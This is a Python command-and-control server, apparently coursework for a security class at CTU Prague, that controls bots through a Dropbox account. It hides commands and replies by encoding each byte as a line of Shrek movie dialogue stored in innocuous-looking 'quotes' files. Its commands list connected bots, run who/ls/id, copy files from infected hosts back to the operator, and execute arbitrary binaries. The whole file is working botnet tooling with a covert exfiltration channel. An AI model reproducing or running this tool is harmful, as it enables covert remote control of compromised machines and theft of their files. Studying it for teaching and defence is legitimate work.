#!/usr/bin/env python3

import datetime
import os
from typing import Dict, List
import dropbox

bots: List[str] = []
messages = {}
responses: Dict[str, List[str]] = {}

byte_phrases = [
    "All right, get out of here.",
    "All of you, move it!",
    "Come on!",
    "Let's go!",
    "Hapaya! Hey!",
    "Quickly.",
    "Come on!",
    "(more dwarves run inside the house)",
    "No, no!",
    "Not there.",
    "(they shut the door on him)",
    "(turns to look at Donkey)",
    "Hey, don't look at me.",
    "I didn't invite them.",
    "Oh, gosh, no one invited us.",
    "What?",
    "We were forced to come here.",
    "(flabbergasted)",
    "By who?",
    "Lord Farquaad.",
    "He huffed and he puffed and he...signed an eviction notice.",
    "(heavy sigh)",
    "Who knows where this Farquaad guy is?",
    "Everyone looks around at each other but no one answers.",
    "Oh, I do.",
    "I know where he is.",
    "Does anyone else know where to find him?",
    "Anyone at all?",
    "Me!",
    "Anyone?",
    "(sigh)",
    "Attention, all fairy tale things.",
    "Do not get comfortable.",
    "Your welcome is officially worn out.",
    "In fact, I'm gonna see this guy Farquaad right now and get you all off my land and back where you came from!",
    "(Pause, then the crowd goes wild.)",
    "(to Donkey)",
    "You're comin' with me.",
    "All right, that's what I like to hear, man.",
    "Shrek and Donkey, two stalwart friends, off on a whirlwind big-city adventure.",
    "I love it!",
    "(singing)",
    "On the road again.",
    "Sing it with me, Shrek.",
    "I can't wait to get on the road again.",
    "What did I say about singing?",
    "Can I whistle?",
    "No.",
    "Can I hum it?",
    "All right, hum it.",
    "Donkey begins to hum 'On the Road Again'.",
    "A masked man is torturing the Gingerbread Man. ",
    "He's continually dunking him in a glass of milk.",
    "Lord Farquaad walks in.",
    "That's enough.",
    "He's ready to talk.",
    "The Gingerbread Man is pulled out of the milk and slammed down onto a cookie sheet.",
    "Farquaad laughs as he walks over to the table.",
    "However when he reaches the table we see that it goes up to his eyes.",
    "He clears his throat and the table is lowered.",
    "(He picks up the Gingerbread Man's legs and plays with them.)",
    "Run, run, run, as fast as you can.",
    "You can't catch me.",
    "I'm the gingerbread man.",
    "You are a monster.",
    "I'm not the monster here.",
    "You and the rest of that fairy tale trash, poisoning my perfect world.",
    "Where are the others?",
    "Eat me!",
    "(He spits milk into Farquaad's eye.)",
    "I've tried to be fair to you creatures.",
    "Now my patience has reached its end!",
    "(He makes as if to pull off the Gingerbread Man's buttons)",
    "No, no, not the buttons.",
    "Not my gumdrop buttons.",
    "Who's hiding them?",
    "Do you know the muffin man?",
    "The muffin man?",
    "The muffin man.",
    "Yes, I know the muffin man, who lives on Drury Lane?",
    "Well, she's married to the muffin man.",
    "She's married to the muffin man.",
    "The door opens and the Head Guard walks in.",
    "Then what are you waiting for? ",
    "Bring it in.",
    "More guards enter carrying something that is covered by a sheet.",
    "They hang up whatever it is and remove the sheet.",
    "It is the Magic Mirror.",
    "(in awe)",
    "Magic mirror...",
    "Don't tell him anything!",
    "(Farquaad picks him up and dumps him into a trash can with a lid.)",
    "Mirror, mirror on the wall.",
    "Is this not the most perfect kingdom of them all?",
    "Well, technically you're not a king.",
    "Uh, Thelonius.",
    "(Thelonius holds up a hand mirror and smashes it with his fist.)",
    "You were saying?",
    "What I mean is you're not a king yet.",
    "But you can become one.",
    "All you have to do is marry a princess.",
    "(chuckles nervously)",
    "So, just sit back and relax, my lord, because it's time for you to meet today's eligible bachelorettes.",
    "And here they are! Bachelorette number one is a mentally abused shut-in from a kingdom far, far away.",
    "She likes sushi and hot tubbing anytime.",
    "Her hobbies include cooking and cleaning for her two evil sisters.",
    "Please welcome Cinderella.",
    "(shows picture of Cinderella)",
    "Bachelorette number two is a cape-wearing girl from the land of fancy.",
    "Although she lives with seven other men, she's not easy.",
    "Just kiss her dead, frozen lips and find out what a live wire she is.",
    "Give it up for Snow White!",
    "(shows picture of Snow White)",
    "And last, but certainly not last, bachelorette number three is a fiery redhead from a dragon-guarded castle surrounded by hot boiling lava!",
    "But don't let that cool you off.",
    "She's a loaded pistol who likes pina colads and getting caught in the rain.",
    "Yours for the rescuing, Princess Fiona!",
    "(Shows picture of Princess Fiona)",
    "So will it be bachelorette number one, bachelorette number two or bachelorette number three?",
    "(holds up 2 fingers)",
    "Pick number three, my lord!",
    "Okay, okay, uh, number three!",
    "Lord Farquaad, you've chosen Princess Fiona.",
    "Princess Fiona.",
    "She's perfect.",
    "All I have to do is just find someone who can go...",
    "But I probably should mention the little thing that happens at night.",
    "Yes, but after sunset...",
    "Silence!",
    "I will make this Princess Fiona my queen, and DuLoc will finally have the perfect king!",
    "Captain, assemble your finest men.",
    "We're going to have a tournament.",
    "(smiles evilly)",
    "DuLoc Parking Lot - Lancelot Section",
    "Shrek and Donkey come out of the field that is right by the parking lot.",
    "The castle itself is about 40 stories high.",
    "But that's it. That's it right there.",
    "That's DuLoc. I told ya I'd find it.",
    "So, that must be Lord Farquaad's castle.",
    "That's the place.",
    "Do you think maybe he's compensating for something?",
    "(He laughs, but then groans as Donkey doesn't get the joke.)",
    "(He continues walking through the parking lot.)",
    "Wait up, Shrek.",
    "Hurry, darling.",
    "We're late. Hurry.",
    "(The attendant, who is wearing a giant head that looks like Lord Farquaad, screams and begins running through the rows of rope to get to the front gate to get away from Shrek.)",
    "Look, I'm not gonna eat you. I just - - I just - -.ImportError",
    "(He sighs and then begins walking straight through the rows.)",
    "(The attendant runs into a wall and falls down.)",
    "(Shrek and Donkey look at him then continue on into DuLoc.)",
    "They look around but all is quiet.",
    "Where is everybody?",
    "Hey, look at this!",
    "Donkey runs over and pulls a lever that is attached to a box marked 'Information'.",
    "The music winds up and then the box doors open up.",
    "There are little wooden people inside and they begin to sing.",
    "Welcome to DuLoc such a perfect town",
    "Here we have some rules.",
    "Let us lay them down.",
    "Don't make waves, stay in line.",
    "And we'll get along fine.",
    "DuLoc is perfect place.",
    "Please keep off of the grass.",
    "Shine your shoes, wipe your... face.",
    "DuLoc is, DuLoc is.",
    "DuLoc is perfect place.",
    "Suddenly a camera takes Donkey and Shrek's picture.",
    "Wow! Let's do that again! (makes ready",
    "to run over and pull the lever again)",
    "(grabs Donkey's tail and holds him still)",
    "No, no, no!",
    "They hear a trumpet fanfare and head over to the arena.",
    "Brave knights.",
    "You are the best and brightest in all the land.",
    "Today one of you shall prove himself...",
    "As Shrek and Donkey walk down the tunnel to get into the arena Donkey is humming the DuLoc theme song.",
    "You're going the right way for a smacked bottom.",
    "Sorry about that.",
    "That champion shall have the honor - - no, no - - the privilege to go forth and rescue the lovely Princess Fiona from the fiery keep of the dragon.",
    "If for any reason the winner is unsuccessful, the first runner-up will take his place and so on and so forth.",
    "Some of you may die, but it's a sacrifice I am willing to make.",
    "(cheers)",
    "Let the tournament begin!",
    "(He notices Shrek)",
    "It's hideous!",
    "(turns to look at Donkey and then back",
    "at Farquaad)",
    "Ah, that's not very nice.",
    "It's just a donkey.",
    "Knights, new plan!",
    "The one who kills the ogre will be named champion!",
    "Have it him!",
    "Get him!",
    "Now come on!",
    "Hang on now.",
    "(bumps into a table where there are mugs of beer)",
    "Go ahead!",
    "(holds up a mug of beer)",
    "Can't we just settle this over a pint?",
    "Kill the beast!",
    "He takes the mug and smashes the spigot off the large barrel of beer behind him.",
    "The beer comes rushing out drenching the other men and wetting the ground.",
    "It's like mud now.",
    "Shrek slides past the men and picks up a spear that one of the men dropped.",
    "As Shrek begins to fight Donkey hops up onto one of the larger beer barrels.",
    "It breaks free of it's ropes and begins to roll.",
    "Donkey manages to squish two men into the mud.",
    "There is so much fighting going on here I'm not going to go into detail.",
    "Suffice to say that Shrek kicks butt.",
    "Hey, Shrek, tag me!",
    "Shrek comes over and bangs a man's head up against Donkeys.",
    "Shrek gets up on the ropes and interacts with the crowd.",
    "A man tries to sneak up behind Shrek, but Shrek turns in time and sees him.",
    "Give him the chair!",
    "Shrek smashes a chair over the guys back.",
    "Finally all the men are down.",
    "Donkey kicks one of them in the helmet, and the ding sounds the end of the match.",
    "The audience goes wild.",
    "The laughter stops as all of the guards turn their weapons on Shrek.",
    "Shall I give the order, sir?",
    "No, I have a better idea.",
    "People of DuLoc, I give you our champion!",
    "Congratulations, ogre.",
    "You're won the honor of embarking on a great and noble quest.",
    "I'm already in a quest, a quest to get my swamp back.",
    "Your swamp?",
    "Yeah, my swamp!",
    "Where you dumped those fairy tale creatures!",
    "Indeed. All right, ogre. I'll make you",
    "a deal. Go on this quest for me, and",
    "I'll give you your swamp back.",
    "Exactly the way it was?",
    "Down to the last slime-covered toadstool.",
    "And the squatters?",
    "As good as gone.",
    "What kind of quest?",
    "Time Lapse - Donkey and Shrek are now walking through the field heading away from DuLoc.",
    "Shrek is munching on an onion.",
    "Let me get this straight.",
    "You're gonna go fight a dragon and rescue a princess just so Farquaad will give you back a swamp which you only don't have because he filled it full of freaks in the first place. Is that about right?",
    "You know, maybe there's a good reason",
    "donkeys shouldn't talk.",
    "I don't get it.",
    "Why don't you just pull some of that ogre stuff on him?",
    "Throttle him, lay siege to his fortress, grinds his bones to make your bread, the whole ogre trip.",
    "Oh, I know what.",
    "Maybe I could have decapitated an entire village and put their heads on a pike, gotten a knife, cut open their spleen and drink their fluids.",
    "Does that sound good to you?",
    "Uh, no, not really, no.",
    "For your information, there's a lot more to ogres than people think.",
    "Example?",
    "Okay, um, ogres are like onions.",
    "(he holds out his onion)",
    "(sniffs the onion)",
    "They stink?",
]


def refresh_bots(dbx: dropbox.Dropbox):
    global bots
    files = dbx.files_list_folder("/quotes").entries
    bots = [
        f.name.strip(".txt")
        for f in files
        if f.client_modified > datetime.datetime.now() - datetime.timedelta(minutes=2)
    ]


def cmd_bots(dbx: dropbox.Dropbox):
    refresh_bots(dbx)
    print("Connected bots:")
    for i, bot in enumerate(bots):
        print(str(i) + ": " + bot)


def send_message(dbx: dropbox.Dropbox, bot_idx: int, message: str):
    bot_name = bots[bot_idx]
    contents = messages.get(bot_name, "")
    contents += message + "\n---\n"
    messages[bot_name] = contents
    dbx.files_upload(
        bytes(contents, encoding="utf-8"),
        "/fav_scenes/" + bot_name + ".txt",
        mode=dropbox.files.WriteMode.overwrite,
        client_modified=datetime.datetime.now(),
        mute=True,
    )


def bytes_to_text(input: bytes) -> str:
    return "\n".join(byte_phrases[b] for b in input)


def send_cmd(dbx: dropbox.Dropbox, bot_idx: int, cmd: str):
    bts = bytes_to_text(cmd.encode("utf-8"))
    send_message(dbx, bot_idx, bts)


def parse_encoded(input: str) -> List[bytes]:
    bts: List[int] = []
    result: List[bytes] = []
    for line in input.strip().split("\n"):
        if len(line) == 0:
            continue
        if line == "---":
            result.append(bytes(bts))
            bts = []
        else:
            bts.append(byte_phrases.index(line))
    return result


def read_responses(dbx: dropbox.Dropbox):
    global bots
    for bot in bots:
        responses[bot] = []
        try:
            _, res = dbx.files_download("/wtf_dialogues/" + bot + ".txt")
            response_chunks = parse_encoded(res.content.decode("utf-8"))
            for response in response_chunks:
                for i in range(len(response)):
                    if response[i] == 0x00:
                        req = response[:i]
                        res = response[i + 1 :]
                        break
                req_string = req.decode("utf-8")
                req_parts = req_string.split(" ")
                if req_parts[0] == "cp":
                    file_name = os.path.basename(req_parts[1])
                    with open(file_name, "wb") as f:
                        f.write(res)
                    responses[bot].append(req_string + "\nWritten to: " + file_name)
                else:
                    responses[bot].append(req_string + "\n" + res.decode("utf-8"))
        except dropbox.exceptions.ApiError as e:
            print(e)


def print_responses(dbx: dropbox.Dropbox, bot_idx: int):
    read_responses(dbx)
    bot_name = bots[bot_idx]
    print("Responses from " + bot_name + ":")
    print("\n".join(responses.get(bot_name, "")))


if __name__ == "__main__":
    print("Welcome to the Command and Control Server!")
    print("    by Petr Zahradnik")
    print("    for the course BSY at FEE CTU in Prague")
    print()

    dbx = dropbox.Dropbox(oauth2_access_token=os.environ.get("TOKEN"))

    while True:
        print("> ", end="")
        command = input()
        if command == "exit":
            break
        else:
            parts = command.split(" ")
            if parts[0] == "bots":
                cmd_bots(dbx)
            elif parts[0] == "resp":
                print_responses(dbx, int(parts[1]))
            elif parts[0] == "w":
                send_cmd(dbx, int(parts[1]), "who")
            elif parts[0] == "ls":
                send_cmd(dbx, int(parts[1]), "ls " + parts[2])
            elif parts[0] == "id":
                send_cmd(dbx, int(parts[1]), "id")
            elif parts[0] == "cp":
                send_cmd(dbx, int(parts[1]), "cp " + parts[2])
            elif parts[0] == "run":
                send_cmd(dbx, int(parts[1]), parts[2])
            else:
                print("Available commands:")
                print("    help - print this help")
                print("    exit - exit the server")
                print("    bots - list all connected bots")
                print("    resp <bot> - list all responses from the bot")
                print("    w <bot> - list of users currently logged in")
                print("    ls <bot> <path> - list content of specified directory")
                print("    id <bot> - id of current user")
                print(
                    "    cp <bot> <source> - copy a file from the bot to the controller"
                )
                print(
                    "    run <bot> - execute a binary inside the bot given the name of the binary"
                )
